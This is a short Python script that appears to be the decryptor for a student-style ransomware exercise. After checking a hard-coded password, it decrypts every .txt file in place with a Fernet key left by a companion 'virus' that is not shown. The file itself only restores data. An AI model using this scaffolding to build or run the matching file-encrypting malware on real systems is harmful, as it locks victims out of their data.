#!/usr/bin/env python3

import glob
import os

from cryptography.fernet import Fernet

# path to search file
secretphrase = "group13"
unlock_phrase = input("Enter The password to Unlock the Files")

if unlock_phrase == secretphrase:
    path = '**/*.txt'
    inc = 1
    files = []
    for file in glob.glob(path, recursive=True):
        print(file)
        if file == "virus.py" or file == "thekey.key" or file == "decrypt.py":
            continue
        files.append(file)
        #if os.path.isfile(file):
        print(inc)
        inc = inc+1

    print(files)

    # key = Fernet.generate_key() // This is already Defined on the Virus
    with open("thekey.key" , "rb" ) as key:
        secretkey = key.read()
    # print(key)
    
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)